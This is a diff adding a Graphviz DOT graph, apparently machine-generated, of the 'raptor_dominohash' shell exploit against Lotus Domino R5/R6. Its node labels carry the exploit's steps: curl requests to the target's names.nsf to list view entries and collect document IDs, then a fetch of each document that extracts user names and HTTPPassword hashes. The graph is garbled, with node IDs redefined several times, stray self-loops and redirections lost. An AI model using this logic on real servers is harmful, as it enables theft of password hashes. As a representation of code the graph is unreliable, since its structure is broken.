@@ -1,0 +1,132 @@
+digraph {
+0 [label="i=1 "];
+0 -> 0
+2 [label="tmp1=dominohash1.tmp "];
+2 -> 4 [label="N,"];
+4 [label="tmp2=dominohash2.tmp "];
+4 -> 4
+6 [label="host=$1 "];
+6 -> 6
+128 [label="echo  "];
+128 -> 10 [label="N,N,function,(,),SC,{,"];
+10 [label="echo raptor_dominohash - Lotus Domino R5/R6 HTTPPassword dump "];
+10 -> 12 [label="\n,"];
+12 [label="echo Copyright (c) 2007 Marco Ivaldi <raptor@0xdeadbeef.info> "];
+12 -> 128 [label="\n,"];
+128 [label="echo  "];
+128 -> 128 [label="\n,"];
+128 [label="echo  "];
+128 -> 18 [label="\n,},N,function,(,),SC,{,"];
+18 [label="exit 0 "];
+18 -> 52 [label="\n,"];
+52 [label="header "];
+52 -> 22 [label="\n,},N,function,(,),SC,{,"];
+22 [label="echo usage  : ./raptor_dominohash <host> "];
+22 -> 24 [label="\n,"];
+24 [label="echo example: ./raptor_dominohash 192.168.0.202 "];
+24 -> 129 [label="\n,"];
+129 [label="footer "];
+129 -> 52 [label="\n,"];
+52 [label="header "];
+52 -> 30 [label="\n,},N,function,(,),SC,{,"];
+30 [label="echo error  : curl not found "];
+30 -> 129 [label="\n,"];
+129 [label="footer "];
+129 -> 34 [label="\n,"];
+34 [label="curl=`which curl 2>/dev/null` "];
+34 -> 36 [label="\n,},"];
+36 [label="which curl /dev/null "];
+36 -> 118 [label="N,N,"];
+118 [label="/dev/null "];
+118 -> 118
+66 [label="[ $? -ne 0 ] "];
+66 -> 42 [label="SC,N,if,"];
+42 [label="notfound "];
+42 -> 44 [label=";,then,"];
+44 [label="[ -z $1 ] "];
+44 -> 46 [label="fi,SC,N,if,"];
+46 [label="usage "];
+46 -> 48 [label=";,then,"];
+48 [label="rm -f $tmp1 "];
+48 -> 50 [label="fi,"];
+50 [label="rm -f $tmp2 "];
+50 -> 50
+52 [label="header "];
+52 -> 52
+54 [label="echo Extracting the view entries... "];
+54 -> 54
+56 [label=": "];
+56 -> 58 [label="SC,N,while,"];
+58 [label="curl http://${host}/names.nsf/$defaultview?Readviewentries&Start=${i} /dev/null "];
+58 -> 118 [label="do,N,"];
+118 [label="/dev/null "];
+118 -> 118
+62 [label="grep unid $tmp1 "];
+62 -> 64 [label="N,"];
+64 [label="$tmp1 "];
+64 -> 64
+66 [label="[ $? -ne 0 ] "];
+66 -> 68 [label="\n,SC,N,if,"];
+68 [label="break "];
+68 -> 70 [label=";,then,"];
+70 [label="i=`expr $i + 30` "];
+70 -> 72 [label="fi,\n,"];
+72 [label="expr $i + 30 "];
+72 -> 74 [label="N,N,"];
+74 [label="echo -ne bbbbbbbb$i "];
+74 -> 76 [label="\n,"];
+76 [label="cat $tmp1 "];
+76 -> 78 [label="\n,done,N,"];
+78 [label="awk -Funid= {print $2} "];
+78 -> 80 [label="N,"];
+80 [label="awk -F {print $1} "];
+80 -> 82 [label="N,"];
+82 [label="sort "];
+82 -> 84 [label="N,"];
+84 [label="uniq $tmp2 "];
+84 -> 86 [label="N,"];
+86 [label="$tmp2 "];
+86 -> 86
+88 [label="[ ! -s $tmp2 ] "];
+88 -> 90 [label="SC,N,if,"];
+90 [label="echo No entries found on host ${host}! "];
+90 -> 129 [label=";,then,"];
+129 [label="footer "];
+129 -> 94 [label="\n,"];
+94 [label="echo -ne bbbbbbbbDone!  "];
+94 -> 96 [label="\n,fi,"];
+96 [label="echo , word=\"`wc -l ${tmp2} | awk '{print $1}'` unique entries have been found.\" "];
+96 -> 96
+98 [label="wc -l ${tmp2} "];
+98 -> 100 [label="N,N,"];
+100 [label="awk {print $1} "];
+100 -> 128 [label="N,"];
+128 [label="echo  "];
+128 -> 128
+104 [label="echo Now ready to dump password hashes... "];
+104 -> 104
+128 [label="echo  "];
+128 -> 128
+108 [label="sleep 4 "];
+108 -> 108
+110 [label="cat $tmp2 "];
+110 -> 112 [label="SC,N,for,in,N,"];
+112 [label="echo [http://${host}/names.nsf/$defaultview/${unid}] "];
+112 -> 128 [label="do,"];
+128 [label="echo  "];
+128 -> 116 [label="\n,"];
+116 [label="curl http://${host}/names.nsf/$defaultview/${unid}?OpenDocument /dev/null "];
+116 -> 118 [label="\n,N,"];
+118 [label="/dev/null "];
+118 -> 118
+120 [label="egrep \"FirstName\"|\"LastName\"|\"ShortName\"|\"HTTPPassword\" "];
+120 -> 122 [label="N,"];
+122 [label="awk -Finput name= {print $2} "];
+122 -> 124 [label="N,"];
+124 [label="awk -F type=hidden value= {print $1 \":\\t\" $2} "];
+124 -> 126 [label="N,"];
+126 [label="tr -d \"> "];
+126 -> 128 [label="N,"];
+128 [label="echo  "];
+128 -> 129 [label="\n,"];
+}
